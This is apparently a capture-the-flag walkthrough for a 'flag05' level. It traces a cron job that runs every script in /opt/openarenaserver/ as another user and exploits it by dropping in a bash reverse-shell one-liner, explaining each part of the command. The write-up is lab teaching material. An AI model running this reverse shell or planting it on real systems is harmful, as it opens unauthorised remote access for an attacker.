1.	We receive notification "You have new mail."

2.	[ find / -name "mail" 2>/dev/null ] ==	/usr/lib/byobu/mail
											/var/mail

3.	[ cat /usr/lib/byobu/mail ] == script that checks mail in a specific file
	[ cat /var/mail ] == cron schedule that executes a script located at /usr/sbin/openarenaserver logged as uer 'flag05', every 2 minutes

4.	[ cat /usr/sbin/openarenaserver ] == a script that loops inside directory /opt/openarenaserver/, it executes each file as a script.

5.	write a script at /opt/openarenaserver/ --> [ bash -i >& /dev/tcp/0.0.0.0/5050 0>&1 ] this opens a REVERSE SHELL.
	explained:	- [ bash -i ] == opens an interactive shell
				- [ >& /dev/tcp/0.0.0.0/5050 ] == redirects all outputs to a TCP connection
				- [ 0>&1 ] == redirects stdin to stdout, important to be able to input commands AND bypass ulimit -t 5

